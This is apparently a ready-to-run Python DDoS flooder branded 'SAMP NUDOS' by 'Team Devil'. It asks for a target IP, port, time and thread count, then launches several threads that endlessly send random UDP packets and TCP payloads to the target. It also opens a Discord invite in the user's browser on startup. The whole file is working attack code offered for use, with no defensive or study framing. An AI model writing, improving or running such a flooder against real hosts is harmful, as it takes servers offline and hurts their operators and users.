# AUTHOR SAMP NUDOS
import random
import socket
import threading
import os
import sys
import time

###### MESSAGE MIKA ON TOP! #####
os.system("clear")
os.system("xdg-open https://discord.gg/8gmRVnRRwV")
print("\u001b[35m Welcome to SAMP-NUDOS World")
time.sleep(2)
print("Loading.......")
os.system("clear")

print("\u001b[31m DDos By !!!!!!!!!!! Team Devil ")
print("\u001b[33m CEO : freedev ")

ip = str(input(" Target IP :"))
port = int(input(" Target Port :"))
choice = str(input(" (y/n) :"))
times = int(input(" Time :"))
threads = int(input(" Threads :"))

def run():
    data = random._urandom(1024)
    i = random.choice(("[*]","[!]","[#]"))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            addr = (str(ip),int(port))
            for x in range(times):
                s.sendto(data,addr)
            print(i +"Attack Sent!!!")
        except:
            print("[!] Error!!!")

def run2():
    data = random._urandom(999)
    i = random.choice(("[*]","[!]","[#]"))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip,port))
            s.send(data)
            for x in range(times):
                s.send(data)
            print(i +"Attack Sent!!!")
        except:
            s.close()
            print("[*] Error!!!")
            

def run3():
    data = random._urandom(818)
    i = random.choice(("[*]","[!]","[#]"))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip,port))
            s.send(data)
            for x in range(times):
                s.send(data)
            print(i +"Attack Sent!!!")
        except:
            s.close()
            print("[*] Error!!!")
            
  
def run4():
    data = random._urandom(16)
    i = random.choice(("[*]","[!]","[#]"))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip,port))
            s.send(data)
            for x in range(times):
                s.send(data)
            print(i +"Attack Sent!!!")
        except:
            s.close()
            print("[*] Error!!!")

def run5():
    data = random._urandom(512)
    i = random.choice(("[*]","[!]","[#]"))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            addr = (str(ip),int(port))
            for x in range(times):
                s.sendto(data,addr)
            print(i +"Attack Sent!!!")
        except:
            print("[!] Error!!!")

for _ in range(4):
    th = threading.Thread(target=run5)
    th.start()

for y in range(threads):
    if choice == 'y':
        th = threading.Thread(target=run)
        th.start()
        th = threading.Thread(target=run2)
        th.start()
        th = threading.Thread(target=run3)
        th.start()
    else:
        th = threading.Thread(target=run4)
        th.start()